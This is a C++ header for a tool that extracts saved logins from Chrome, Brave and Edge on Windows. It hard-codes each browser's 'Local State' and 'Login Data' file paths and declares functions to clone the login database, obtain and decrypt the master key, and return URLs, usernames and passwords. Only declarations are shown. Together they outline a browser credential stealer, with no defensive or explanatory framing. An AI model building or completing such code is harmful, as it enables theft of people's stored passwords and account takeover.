#include <windows.h>
#include <wincrypt.h>
#include <vector>
#include <map>
#include <fstream>
#include <iostream>
#include <filesystem>

#include "sqlite3.h"
#include "crypto.hpp"

namespace chromium
{
    struct login_entry {
        std::string url;
        std::string username;
        std::string password;
    };

    struct browser_data {
        std::string local_state;
        std::string login_data;
    };

    enum Browser { Chrome = 1, Brave = 2, Edge = 3};

    inline std::map<Browser, browser_data> paths = {
        {Chrome, {
            std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Local State",
            std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data"
        }},
        {Brave, {
            std::string(getenv("LOCALAPPDATA")) + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
            std::string(getenv("LOCALAPPDATA")) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
        }},
        {Edge, {
            std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Local State",
            std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
        }}
    };

    std::vector<login_entry> get_logins(const chromium::Browser& browser);

    std::string clone_database(const std::string& path);
    std::string master_key(const Browser& browser);

    bool decrypt_key(std::string& key);
}